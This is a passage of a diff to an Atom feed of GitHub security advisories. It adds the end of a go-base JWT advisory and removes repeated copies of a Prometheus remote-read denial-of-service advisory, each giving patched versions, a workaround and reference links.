+<li>Users should update to the latest master, regenerate their JWT secret, and restart.</li>
+</ul>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>Fix PR: <a href="https://github.com/dhax/go-base/pull/31">https://github.com/dhax/go-base/pull/31</a></li>
+<li>Commit history: <a href="https://github.com/dhax/go-base/commits/master">https://github.com/dhax/go-base/commits/master</a></li>
+</ul>
+<h3 id="credit">Credit</h3>
+<p>Reported by @saaa99999999 via manual security audit.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dhax/go-base/security/advisories/GHSA-mqq6-462x-jxmm">https://github.com/dhax/go-base/security/advisories/GHSA-mqq6-462x-jxmm</a></li>
+<li><a href="https://github.com/dhax/go-base/commit/cc82b9740fa6b08e0fad409cd4b418e240dd0e00">https://github.com/dhax/go-base/commit/cc82b9740fa6b08e0fad409cd4b418e240dd0e00</a></li>
+<li><a href="https://github.com/advisories/GHSA-mqq6-462x-jxmm">https://github.com/advisories/GHSA-mqq6-462x-jxmm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mqq6-462x-jxmm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-10T13:39:18.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/dexidp/dex] Dex: Token-exchange endpoint is missing AllowedConnectors enforcement]]></title>
         <id>https://github.com/advisories/GHSA-7qjx-gp9h-65qj</id>
@@ -1666,101 +2188,5 @@ for k := range dp {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-12T15:08:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/prometheus/prometheus] Prometheus: Remote read endpoint allows denial of service via crafted snappy payload]]></title>
-        <id>https://github.com/advisories/GHSA-8rm2-7qqf-34qm</id>
-        <link href="https://github.com/advisories/GHSA-8rm2-7qqf-34qm"/>
-        <updated>2026-06-08T16:22:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The remote read endpoint (<code>/api/v1/read</code>) does not validate the declared decoded length in a snappy-compressed request body before allocating memory.
-An unauthenticated attacker can send a small payload that causes a huge heap allocation per request. Under concurrent load this can exhaust available memory and crash the Prometheus process.</p>
-<h3 id="patches">Patches</h3>
-<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
-<p>Fixed in 3.11.3 and 3.5.3 LTS. Users should upgrade to these versions or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>User who can not upgrade can place Prometheus behind a reverse proxy or firewall that requires authentication before requests reach /api/v1/read.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/prometheus/prometheus/security/advisories/GHSA-8rm2-7qqf-34qm">https://github.com/prometheus/prometheus/security/advisories/GHSA-8rm2-7qqf-34qm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42154">https://nvd.nist.gov/vuln/detail/CVE-2026-42154</a></li>
-<li><a href="https://github.com/prometheus/prometheus/pull/18584">https://github.com/prometheus/prometheus/pull/18584</a></li>
-<li><a href="https://github.com/prometheus/prometheus/pull/18585">https://github.com/prometheus/prometheus/pull/18585</a></li>
-<li><a href="https://github.com/prometheus/prometheus/releases/tag/v3.11.3">https://github.com/prometheus/prometheus/releases/tag/v3.11.3</a></li>
-<li><a href="https://github.com/prometheus/prometheus/releases/tag/v3.5.3">https://github.com/prometheus/prometheus/releases/tag/v3.5.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-8rm2-7qqf-34qm">https://github.com/advisories/GHSA-8rm2-7qqf-34qm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8rm2-7qqf-34qm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T19:34:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/prometheus/prometheus] Prometheus: Remote read endpoint allows denial of service via crafted snappy payload]]></title>
-        <id>https://github.com/advisories/GHSA-8rm2-7qqf-34qm</id>
-        <link href="https://github.com/advisories/GHSA-8rm2-7qqf-34qm"/>
-        <updated>2026-06-08T16:22:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The remote read endpoint (<code>/api/v1/read</code>) does not validate the declared decoded length in a snappy-compressed request body before allocating memory.
-An unauthenticated attacker can send a small payload that causes a huge heap allocation per request. Under concurrent load this can exhaust available memory and crash the Prometheus process.</p>
-<h3 id="patches">Patches</h3>
-<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
-<p>Fixed in 3.11.3 and 3.5.3 LTS. Users should upgrade to these versions or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>User who can not upgrade can place Prometheus behind a reverse proxy or firewall that requires authentication before requests reach /api/v1/read.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/prometheus/prometheus/security/advisories/GHSA-8rm2-7qqf-34qm">https://github.com/prometheus/prometheus/security/advisories/GHSA-8rm2-7qqf-34qm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42154">https://nvd.nist.gov/vuln/detail/CVE-2026-42154</a></li>
-<li><a href="https://github.com/prometheus/prometheus/pull/18584">https://github.com/prometheus/prometheus/pull/18584</a></li>
-<li><a href="https://github.com/prometheus/prometheus/pull/18585">https://github.com/prometheus/prometheus/pull/18585</a></li>
-<li><a href="https://github.com/prometheus/prometheus/releases/tag/v3.11.3">https://github.com/prometheus/prometheus/releases/tag/v3.11.3</a></li>
-<li><a href="https://github.com/prometheus/prometheus/releases/tag/v3.5.3">https://github.com/prometheus/prometheus/releases/tag/v3.5.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-8rm2-7qqf-34qm">https://github.com/advisories/GHSA-8rm2-7qqf-34qm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8rm2-7qqf-34qm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T19:34:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/prometheus/prometheus] Prometheus: Remote read endpoint allows denial of service via crafted snappy payload]]></title>
-        <id>https://github.com/advisories/GHSA-8rm2-7qqf-34qm</id>
-        <link href="https://github.com/advisories/GHSA-8rm2-7qqf-34qm"/>
-        <updated>2026-06-08T16:22:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The remote read endpoint (<code>/api/v1/read</code>) does not validate the declared decoded length in a snappy-compressed request body before allocating memory.
-An unauthenticated attacker can send a small payload that causes a huge heap allocation per request. Under concurrent load this can exhaust available memory and crash the Prometheus process.</p>
-<h3 id="patches">Patches</h3>
-<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
-<p>Fixed in 3.11.3 and 3.5.3 LTS. Users should upgrade to these versions or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>User who can not upgrade can place Prometheus behind a reverse proxy or firewall that requires authentication before requests reach /api/v1/read.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/prometheus/prometheus/security/advisories/GHSA-8rm2-7qqf-34qm">https://github.com/prometheus/prometheus/security/advisories/GHSA-8rm2-7qqf-34qm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42154">https://nvd.nist.gov/vuln/detail/CVE-2026-42154</a></li>
-<li><a href="https://github.com/prometheus/prometheus/pull/18584">https://github.com/prometheus/prometheus/pull/18584</a></li>
-<li><a href="https://github.com/prometheus/prometheus/pull/18585">https://github.com/prometheus/prometheus/pull/18585</a></li>
-<li><a href="https://github.com/prometheus/prometheus/releases/tag/v3.11.3">https://github.com/prometheus/prometheus/releases/tag/v3.11.3</a></li>
-<li><a href="https://github.com/prometheus/prometheus/releases/tag/v3.5.3">https://github.com/prometheus/prometheus/releases/tag/v3.5.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-8rm2-7qqf-34qm">https://github.com/advisories/GHSA-8rm2-7qqf-34qm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8rm2-7qqf-34qm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-05T19:34:05.000Z</published>
     </entry>
 </feed>
